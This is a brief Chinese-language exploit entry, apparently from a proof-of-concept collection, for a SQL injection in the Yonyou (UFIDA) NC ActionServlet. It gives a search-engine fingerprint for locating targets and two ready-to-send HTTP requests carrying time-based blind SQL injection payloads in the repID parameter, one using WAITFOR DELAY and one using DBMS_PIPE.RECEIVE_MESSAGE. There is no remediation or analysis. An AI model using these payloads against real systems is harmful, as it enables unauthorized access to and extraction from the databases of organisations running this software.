# 用友NC-ActionServlet-sql注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:6'--+&unitID=public HTTP/1.1`
- **关键头**：`SOAPAction: [http://tempuri.org/GetHomeInfo](http://tempuri.org/GetHomeInfo)`

**请求体 / payload**
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20AND%206371%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%2866%29%7C%7CCHR%28105%29%7C%7CCHR%2889%29%2C6%29--&unitID=public HTTP/1.1
Host:
SOAPAction: [http://tempuri.org/GetHomeInfo](http://tempuri.org/GetHomeInfo)
```